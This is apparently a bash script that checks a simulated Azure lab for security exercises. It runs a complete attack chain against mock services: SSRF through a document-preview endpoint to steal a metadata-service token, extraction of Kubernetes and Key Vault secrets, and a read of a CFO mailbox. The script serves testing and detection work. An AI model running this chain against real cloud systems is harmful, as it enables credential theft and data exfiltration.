#!/bin/bash
# verify_attack_chain.sh - Verify romulus AKS SSRF attack chain on SABER compose stack
#
# Runs verification from inside the sentinel container (which has network access to all services)
#
# Usage:
#   ./verify_attack_chain.sh                    # Use default EPISODE_ID=test001
#   EPISODE_ID=mytest ./verify_attack_chain.sh  # Use custom episode ID
#   ./verify_attack_chain.sh -v                 # Verbose output

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

EPISODE_ID="${EPISODE_ID:-test001}"
SENTINEL_CONTAINER="azure-sentinel-${EPISODE_ID}"
VERBOSE=false

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--verbose) VERBOSE=true; shift ;;
        -h|--help)
            echo "Usage: EPISODE_ID=xxx $0 [-v]"
            echo "  -v  Verbose output"
            exit 0
            ;;
        *) shift ;;
    esac
done

PASSED=0
FAILED=0

pass() { echo -e "  ${GREEN}✓${NC} $1"; PASSED=$((PASSED + 1)); }
fail() { echo -e "  ${RED}✗${NC} $1"; FAILED=$((FAILED + 1)); }
info() { echo -e "  ${BLUE}→${NC} $1"; }

# Run python inside sentinel container
run_in_sentinel() {
    docker exec "$SENTINEL_CONTAINER" python -c "$1" 2>/dev/null
}

echo "============================================================"
echo "Romulus AKS SSRF Attack Chain Verification"
echo "Episode: $EPISODE_ID"
echo "============================================================"
echo ""

# =============================================================================
# Check containers are running
# =============================================================================
echo -e "${BLUE}[1/7] Container Status${NC}"

CONTAINERS=(
    "azure-sentinel-${EPISODE_ID}"
    "aks-hr-app-${EPISODE_ID}"
    "azure-kubernetes-api-${EPISODE_ID}"
    "azure-imds-${EPISODE_ID}"
    "azure-keyvault-${EPISODE_ID}"
    "azure-ad-${EPISODE_ID}"
    "azure-exchange-${EPISODE_ID}"
    "azure-arm-${EPISODE_ID}"
    "azure-functions-${EPISODE_ID}"
    "azure-front-door-${EPISODE_ID}"
    "network-gateway-${EPISODE_ID}"
)

for container in "${CONTAINERS[@]}"; do
    if docker ps --format '{{.Names}}' | grep -q "^${container}$"; then
        STATUS=$(docker inspect --format='{{.State.Health.Status}}' "$container" 2>/dev/null || echo "no-healthcheck")
        if [[ "$STATUS" == "healthy" ]] || [[ "$STATUS" == "no-healthcheck" ]]; then
            pass "$container ($STATUS)"
        else
            fail "$container ($STATUS)"
        fi
    else
        fail "$container (not running)"
    fi
done
echo ""

# =============================================================================
# Health Checks
# =============================================================================
echo -e "${BLUE}[2/7] Service Health Checks${NC}"

HEALTH_RESULT=$(run_in_sentinel "
import urllib.request, json, ssl

ctx = ssl._create_unverified_context()
services = {
    'AKS Pod': 'http://aks-pod:8080/health',
    'IMDS': 'http://imds:80/health',
    'Front Door': 'http://front-door:8080/health',
    'Azure AD': 'http://azure-ad:8080/health',
    'Functions': 'http://azure-functions:7071/health',
    'Sentinel': 'http://localhost:5000/health',
}

# HTTPS services
https_services = {
    'Kubernetes API': 'https://kubernetes-api:443/health',
    'KeyVault': 'https://keyvault:443/health',
    'Exchange': 'https://exchange-online:443/health',
}

for name, url in services.items():
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        data = json.loads(resp.read())
        print(f'OK|{name}|{data.get(\"status\", \"up\")}')
    except Exception as e:
        print(f'FAIL|{name}|{str(e)[:50]}')

for name, url in https_services.items():
    try:
        resp = urllib.request.urlopen(url, timeout=5, context=ctx)
        data = json.loads(resp.read())
        print(f'OK|{name}|{data.get(\"status\", \"up\")}')
    except Exception as e:
        print(f'FAIL|{name}|{str(e)[:50]}')
")

while IFS='|' read -r status name detail; do
    if [[ "$status" == "OK" ]]; then
        pass "$name: $detail"
    else
        fail "$name: $detail"
    fi
done <<< "$HEALTH_RESULT"
echo ""

# =============================================================================
# Phase 1: Initial Access - SSRF in AKS HR App
# =============================================================================
echo -e "${BLUE}[3/7] Phase 1: Initial Access (SSRF in AKS HR App)${NC}"

PHASE1_RESULT=$(run_in_sentinel "
import urllib.request, json

# Recon: Check /api/status for hints about features
try:
    resp = urllib.request.urlopen('http://aks-pod:8080/api/status', timeout=5)
    data = json.loads(resp.read())
    features = data.get('features', {})
    if features.get('document_preview'):
        print('OK|/api/status reveals document_preview feature')
    else:
        print('FAIL|/api/status missing document_preview hint')
except Exception as e:
    print(f'FAIL|/api/status: {e}')

# Exploit SSRF via document preview - probe IMDS token endpoint (using internal hostname)
try:
    req = urllib.request.Request(
        'http://aks-pod:8080/api/document/preview',
        data=json.dumps({'url': 'http://imds/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'}).encode(),
        headers={'Content-Type': 'application/json'},
        method='POST'
    )
    resp = urllib.request.urlopen(req, timeout=10)
    data = json.loads(resp.read())
    # Response is wrapped in 'response' key
    response = data.get('response', data)
    if isinstance(response, dict) and 'access_token' in response:
        print('OK|SSRF achieved - IMDS token endpoint accessible')
    elif isinstance(response, str) and 'access_token' in response:
        print('OK|SSRF achieved - IMDS token endpoint accessible')
    else:
        print('FAIL|SSRF response missing IMDS data')
except Exception as e:
    print(f'FAIL|SSRF exploit: {e}')
")

while IFS='|' read -r status msg; do
    [[ -z "$status" ]] && continue
    if [[ "$status" == "OK" ]]; then
        pass "$msg"
    else
        fail "$msg"
    fi
done <<< "$PHASE1_RESULT"
echo ""

# =============================================================================
# Phase 2: Credential Access - IMDS Token Theft
# =============================================================================
echo -e "${BLUE}[4/7] Phase 2: Credential Theft (IMDS Token via SSRF)${NC}"

TOKEN=$(run_in_sentinel "
import urllib.request, json

try:
    req = urllib.request.Request(
        'http://aks-pod:8080/api/document/preview',
        data=json.dumps({
            'url': 'http://imds/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
        }).encode(),
        headers={'Content-Type': 'application/json'},
        method='POST'
    )
    resp = urllib.request.urlopen(req, timeout=10)
    data = json.loads(resp.read())
    
    # Handle wrapped response - token is in 'response' key
    response = data.get('response', data)
    if isinstance(response, str):
        response = json.loads(response)
    
    if 'access_token' in response:
        print('TOKEN:' + response['access_token'])
        print('OK|Managed Identity token stolen via SSRF')
        print('OK|Token type: ' + response.get('token_type', 'Bearer'))
    else:
        print('FAIL|No access_token in response')
        print(f'DEBUG|Response keys: {list(data.keys())[:5]}')
except Exception as e:
    print(f'FAIL|IMDS theft: {e}')
")

BEARER_TOKEN=""
while IFS='|' read -r status msg; do
    [[ -z "$status" ]] && continue
    if [[ "$status" == "TOKEN:"* ]]; then
        BEARER_TOKEN="${status#TOKEN:}"
    elif [[ "$status" == "OK" ]]; then
        pass "$msg"
    elif [[ "$status" == "DEBUG" ]]; then
        [[ "$VERBOSE" == "true" ]] && info "$msg"
    else
        fail "$msg"
    fi
done <<< "$TOKEN"

[[ "$VERBOSE" == "true" ]] && [[ -n "$BEARER_TOKEN" ]] && echo "      Token: ${BEARER_TOKEN:0:50}..."
echo ""

# =============================================================================
# Phase 3: Kubernetes Secrets Enumeration
# =============================================================================
echo -e "${BLUE}[5/7] Phase 3: Kubernetes Secrets Enumeration${NC}"

K8S_SECRETS=""
if [[ -z "$BEARER_TOKEN" ]]; then
    fail "Skipping - no token from Phase 2"
else
    K8S_RESULT=$(run_in_sentinel "
import urllib.request, json, ssl

token = '''$BEARER_TOKEN'''
ctx = ssl._create_unverified_context()

# List namespaces
try:
    req = urllib.request.Request(
        'https://kubernetes-api:443/api/v1/namespaces',
        headers={'Authorization': f'Bearer {token}'}
    )
    resp = urllib.request.urlopen(req, context=ctx, timeout=10)
    data = json.loads(resp.read())
    namespaces = [ns['metadata']['name'] for ns in data.get('items', [])]
    if 'production' in namespaces:
        print('OK|Kubernetes: production namespace discovered')
    else:
        print(f'FAIL|Kubernetes: production not in namespaces: {namespaces}')
except Exception as e:
    print(f'FAIL|Kubernetes namespaces: {e}')

# List secrets in production namespace
try:
    req = urllib.request.Request(
        'https://kubernetes-api:443/api/v1/namespaces/production/secrets',
        headers={'Authorization': f'Bearer {token}'}
    )
    resp = urllib.request.urlopen(req, context=ctx, timeout=10)
    data = json.loads(resp.read())
    secrets = [s['metadata']['name'] for s in data.get('items', [])]
    if 'keyvault-credentials' in secrets:
        print('OK|Kubernetes: keyvault-credentials secret found')
    else:
        print(f'FAIL|Kubernetes: keyvault-credentials not in secrets')
    if 'azure-credentials' in secrets:
        print('OK|Kubernetes: azure-credentials secret found')
except Exception as e:
    print(f'FAIL|Kubernetes secrets: {e}')

# Get keyvault-credentials secret data
try:
    req = urllib.request.Request(
        'https://kubernetes-api:443/api/v1/namespaces/production/secrets/keyvault-credentials',
        headers={'Authorization': f'Bearer {token}'}
    )
    resp = urllib.request.urlopen(req, context=ctx, timeout=10)
    data = json.loads(resp.read())
    secret_data = data.get('data', {})
    if 'KEYVAULT_URL' in secret_data:
        import base64
        kv_url = base64.b64decode(secret_data['KEYVAULT_URL']).decode()
        print(f'OK|Kubernetes: KeyVault URL extracted ({kv_url})')
        print(f'KVURL:{kv_url}')
    else:
        print('FAIL|Kubernetes: KEYVAULT_URL not in secret')
except Exception as e:
    print(f'FAIL|Kubernetes keyvault secret: {e}')
")

    while IFS='|' read -r status msg; do
        [[ -z "$status" ]] && continue
        if [[ "$status" == "KVURL:"* ]]; then
            K8S_SECRETS="${status#KVURL:}"
        elif [[ "$status" == "OK" ]]; then
            pass "$msg"
        else
            fail "$msg"
        fi
    done <<< "$K8S_RESULT"
fi
echo ""

# =============================================================================
# Phase 4: Azure Key Vault Access
# =============================================================================
echo -e "${BLUE}[6/7] Phase 4: Azure Key Vault - Exchange SP Credentials${NC}"

EXCHANGE_CLIENT_ID=""
EXCHANGE_CLIENT_SECRET=""
if [[ -z "$BEARER_TOKEN" ]]; then
    fail "Skipping - no token from Phase 2"
else
    KV_RESULT=$(run_in_sentinel "
import urllib.request, json, ssl

token = '''$BEARER_TOKEN'''
ctx = ssl._create_unverified_context()

# Get exchange-sp-client-id
try:
    req = urllib.request.Request(
        'https://keyvault:443/secrets/exchange-sp-client-id?api-version=7.4',
        headers={'Authorization': f'Bearer {token}'}
    )
    resp = urllib.request.urlopen(req, context=ctx, timeout=10)
    data = json.loads(resp.read())
    if 'value' in data:
        print('OK|KeyVault: exchange-sp-client-id retrieved')
        print(f'CLIENT_ID:{data[\"value\"]}')
    else:
        print('FAIL|KeyVault: No value in client-id response')
except Exception as e:
    print(f'FAIL|KeyVault client-id: {e}')

# Get exchange-sp-client-secret
try:
    req = urllib.request.Request(
        'https://keyvault:443/secrets/exchange-sp-client-secret?api-version=7.4',
        headers={'Authorization': f'Bearer {token}'}
    )
    resp = urllib.request.urlopen(req, context=ctx, timeout=10)
    data = json.loads(resp.read())
    if 'value' in data:
        print('OK|KeyVault: exchange-sp-client-secret retrieved')
        print(f'CLIENT_SECRET:{data[\"value\"]}')
    else:
        print('FAIL|KeyVault: No value in client-secret response')
except Exception as e:
    print(f'FAIL|KeyVault client-secret: {e}')
")

    while IFS='|' read -r status msg; do
        [[ -z "$status" ]] && continue
        if [[ "$status" == "CLIENT_ID:"* ]]; then
            EXCHANGE_CLIENT_ID="${status#CLIENT_ID:}"
        elif [[ "$status" == "CLIENT_SECRET:"* ]]; then
            EXCHANGE_CLIENT_SECRET="${status#CLIENT_SECRET:}"
        elif [[ "$status" == "OK" ]]; then
            pass "$msg"
        else
            fail "$msg"
        fi
    done <<< "$KV_RESULT"
fi

[[ "$VERBOSE" == "true" ]] && [[ -n "$EXCHANGE_CLIENT_ID" ]] && echo "      Client ID: $EXCHANGE_CLIENT_ID"
[[ "$VERBOSE" == "true" ]] && [[ -n "$EXCHANGE_CLIENT_SECRET" ]] && echo "      Client Secret: ${EXCHANGE_CLIENT_SECRET:0:20}..."
echo ""

# =============================================================================
# Phase 5 & 6: Azure AD Auth + Exchange Exfiltration
# =============================================================================
echo -e "${BLUE}[7/7] Phase 5-6: Azure AD Auth + Exchange Exfiltration${NC}"

if [[ -z "$EXCHANGE_CLIENT_ID" ]] || [[ -z "$EXCHANGE_CLIENT_SECRET" ]]; then
    fail "Skipping - missing Exchange SP credentials from Phase 4"
else
    EXFIL_RESULT=$(run_in_sentinel "
import urllib.request, json, ssl
from urllib.parse import urlencode

client_id = '''$EXCHANGE_CLIENT_ID'''
client_secret = '''$EXCHANGE_CLIENT_SECRET'''
ctx = ssl._create_unverified_context()
tenant_id = '87654321-4321-4321-4321-cba987654321'

# Phase 5: Azure AD - Get Graph API token
graph_token = None
try:
    token_url = f'http://azure-ad:8080/{tenant_id}/oauth2/v2.0/token'
    data = urlencode({
        'grant_type': 'client_credentials',
        'client_id': client_id,
        'client_secret': client_secret,
        'scope': 'https://graph.microsoft.com/.default'
    }).encode()
    
    req = urllib.request.Request(token_url, data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    resp = urllib.request.urlopen(req, timeout=10)
    token_data = json.loads(resp.read())
    
    if 'access_token' in token_data:
        graph_token = token_data['access_token']
        print('OK|Azure AD: Graph API token acquired via client_credentials')
    else:
        print('FAIL|Azure AD: No access_token in response')
except Exception as e:
    print(f'FAIL|Azure AD token: {e}')

# Phase 6: Exchange - Exfiltrate CFO mailbox
if graph_token:
    try:
        req = urllib.request.Request(
            'https://exchange-online:443/v1.0/users/cfo@contoso.com/messages',
            headers={'Authorization': f'Bearer {graph_token}'}
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        data = json.loads(resp.read())
        
        messages = data.get('value', [])
        if messages:
            print(f'OK|Exchange: {len(messages)} emails retrieved from CFO mailbox')
            
            # Check for sensitive content
            sensitive_found = False
            for msg in messages:
                subject = msg.get('subject', '').lower()
                body = msg.get('body', {}).get('content', '').lower() if isinstance(msg.get('body'), dict) else str(msg.get('body', '')).lower()
                if 'acquisition' in subject or 'confidential' in subject or 'acquisition' in body:
                    sensitive_found = True
                    print(f'OK|Exchange: Sensitive email found - \"{msg.get(\"subject\", \"\")}\"')
                    break
            
            if not sensitive_found:
                print('OK|Exchange: Emails retrieved (check content manually)')
        else:
            print('FAIL|Exchange: No messages in response')
    except Exception as e:
        print(f'FAIL|Exchange mailbox: {e}')
else:
    print('FAIL|Exchange: Skipped - no Graph token')

# Additional: Check Sentinel logs
try:
    resp = urllib.request.urlopen('http://localhost:5000/health', timeout=5)
    data = json.loads(resp.read())
    log_count = data.get('logCount', 0)
    print(f'OK|Sentinel: {log_count} attack logs captured')
except Exception as e:
    print(f'FAIL|Sentinel: {e}')
")

    while IFS='|' read -r status msg; do
        [[ -z "$status" ]] && continue
        if [[ "$status" == "OK" ]]; then
            pass "$msg"
        else
            fail "$msg"
        fi
    done <<< "$EXFIL_RESULT"
fi
echo ""

# =============================================================================
# Summary
# =============================================================================
echo "============================================================"
TOTAL=$((PASSED + FAILED))
if [[ $FAILED -eq 0 ]]; then
    echo -e "${GREEN}All $PASSED checks passed!${NC}"
    echo "============================================================"
    echo ""
    echo "Attack chain verified (AKS SSRF → Exchange Exfil):"
    echo "  1. Initial Access    → SSRF via /api/document/preview"
    echo "  2. Credential Access → IMDS Managed Identity token theft"
    echo "  3. Discovery         → Kubernetes secrets enumeration"
    echo "  4. Credential Access → KeyVault Exchange SP credentials"
    echo "  5. Privilege Esc     → Azure AD client_credentials grant"
    echo "  6. Exfiltration      → Exchange 365 CFO mailbox access"
    echo "  7. Detection         → Sentinel SIEM log capture"
    echo ""
    exit 0
else
    echo -e "${YELLOW}$PASSED passed, ${RED}$FAILED failed${NC} (of $TOTAL)"
    echo "============================================================"
    exit 1
fi
